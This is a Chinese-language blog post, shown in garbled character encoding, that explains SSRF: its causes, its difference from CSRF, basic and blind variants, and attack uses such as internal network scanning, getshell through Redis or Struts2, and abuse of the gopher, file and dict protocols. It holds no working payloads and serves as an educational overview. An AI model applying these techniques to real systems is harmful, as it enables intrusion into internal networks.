<ol><li> <p>SSRFç®€ä»‹<br> SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼Œæ˜¯æ”»å‡»è€…è®©æœåŠ¡ç«¯å‘èµ·æ„é€ çš„æŒ‡å®šè¯·æ±‚é“¾æ¥é€ æˆçš„æ¼æ´ã€‚</p> <p>ç”±äºå­˜åœ¨é˜²ç«å¢™çš„é˜²æŠ¤ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥å…¥ä¾µå†…ç½‘ï¼›è¿™æ—¶æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨ä¸ºè·³æ¿å‘èµ·ä¸€äº›ç½‘ç»œè¯·æ±‚ï¼Œä»è€Œæ”»å‡»å†…ç½‘çš„åº”ç”¨åŠè·å–å†…ç½‘æ•°æ®ã€‚</p> </li><li> <p>SSRFå½¢æˆåŸå› <br> å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶å®ƒæœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ä½¿ç”¨æˆ·ä»æŒ‡å®šçš„URL webåº”ç”¨è·å–å›¾ç‰‡ã€ä¸‹è½½æ–‡ä»¶ã€è¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘é€è¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®ã€‚</p> <p>æœ€å¸¸è§çš„ä¾‹å­ï¼šæ”»å‡»è€…ä¼ å…¥ä¸€ä¸ªæœªç»éªŒè¯çš„URLï¼Œåç«¯ä»£ç ç›´æ¥è¯·æ±‚è¿™ä¸ªURLï¼Œå°±ä¼šé€ æˆSSRFæ¼æ´ã€‚</p> </li><li> <p>SSRFä¸CSRFçš„åŒºåˆ«<br> CSRFæ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œéšæœºå€¼æ ¡éªŒï¼Œä¸”å¯¹httpè¯·æ±‚åŒ…å†…çš„referå­—æ®µæ ¡éªŒä¸ä¸¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·çš„cookieä¿¡æ¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚å‘é€è‡³æœåŠ¡å™¨ï¼›</p> <p>SSRFæ˜¯æœåŠ¡å™¨å¯¹ç”¨æˆ·æä¾›çš„å¯æ§URLè¿‡äºä¿¡ä»»ï¼Œæ²¡æœ‰å¯¹æ”»å‡»è€…æä¾›çš„URLè¿›è¡Œåœ°å€é™åˆ¶å’Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»¥æ­¤ä¸ºè·³æ¿æ”»å‡»å†…ç½‘æˆ–è€…å…¶å®ƒæœåŠ¡å™¨ã€‚</p> </li><li> <p>SSRFçš„ç±»å‹<br> 1ï¼‰æ˜¾ç¤ºå¯¹æ”»å‡»è€…çš„å“åº”ï¼ˆbasicï¼‰ï¼šåœ¨æœåŠ¡å™¨è·å–æ”»å‡»è€…è¦æ±‚çš„URLåï¼ŒæŠŠå“åº”å‘é€å›æ”»å‡»è€…ã€‚<br> 2ï¼‰ä¸æ˜¾ç¤ºå“åº”ï¼ˆblindï¼‰ï¼šåœ¨æœåŠ¡å™¨è·å–æ”»å‡»è€…è¦æ±‚çš„URLåï¼Œä¸ä¼šæŠŠå“åº”å†…å®¹å‘é€ç»™æ”»å‡»è€…ï¼Œéœ€è¦é€šè¿‡æŠ“åŒ…æˆ–æŸ¥çœ‹æœåŠ¡å™¨æ—¥å¿—åˆ¤æ–­æ˜¯å¦å­˜åœ¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´ã€‚</p> </li><li> <p>åˆ©ç”¨SSRFå¯ä»¥å®ç°çš„æ”»å‡»<br> 1ï¼‰è·å–webåº”ç”¨å¯è¾¾æœåŠ¡å™¨çš„bannerä¿¡æ¯ï¼ˆå¦‚è½¯ä»¶å¼€å‘å•†ã€è½¯ä»¶åç§°ç­‰ï¼‰ï¼Œä»¥åŠæ”¶é›†å†…ç½‘webåº”ç”¨çš„æŒ‡çº¹è¯†åˆ«ï¼ˆå¦‚å¼€æ”¾çš„ç«¯å£ã€ä¸­é—´ä»¶ç‰ˆæœ¬ç­‰ï¼‰ï¼Œæ ¹æ®è¿™äº›ä¿¡æ¯å†è¿›è¡Œè¿›ä¸€æ­¥çš„æ¸—é€ï¼›<br> 2ï¼‰æ”»å‡»è¿è¡Œåœ¨å†…ç½‘çš„ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºï¼Œè·å–å†…ç½‘ç³»ç»Ÿå¼±å£ä»¤è¿›è¡Œå†…ç½‘æ¼«æ¸¸ï¼Œå¯¹æœ‰æ¼æ´çš„å†…ç½‘webåº”ç”¨å®æ–½æ”»å‡»è·å–webshellï¼ˆå¦‚Struts2å‘½ä»¤æ‰§è¡Œï¼Œdiscuz!è®ºå›SSRFé€šè¿‡Rediså®æ–½getshellç­‰ï¼‰ï¼›<br> 3ï¼‰åˆ©ç”¨æœ‰è„†å¼±æ€§çš„ç»„ä»¶ç»“åˆftp://ï¼Œfile:///ï¼Œgopher://ï¼Œdict://ç­‰åè®®å®æ–½æ”»å‡»ï¼ˆå¦‚FFmpegä»»æ„æ–‡ä»¶è¯»å–ï¼ŒXXEæ”»å‡»ç­‰ï¼‰ã€‚</p> </li><li> <p>æ‹“å±•æ”»å‡»é¢<br> ç»“åˆgopheråè®®æ”»å‡»å†…ç½‘FTPã€Telnetã€Redisã€FastCGIã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œgetã€postè¯·æ±‚ã€‚</p> </li></ol>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0d22fe784eac9271665520bedf9e0dd4/" rel="prev">
			<span class="pager__subtitle">Â«&thinsp;Previous</span>
			<p class="pager__title">ROSä¸­å°†è¯é¢˜æ•°æ®ä¿å­˜åˆ°txtæ–‡æ¡£</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a088a1e7af0bcc5afc37901bf2a2e42d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;Â»</span>
			<p class="pager__title">LinuxåŸºç¡€å…¥é—¨å’Œæ–‡ä»¶ç®¡ç†</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 ITå­¦ä¹ è€…åšå®¢.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>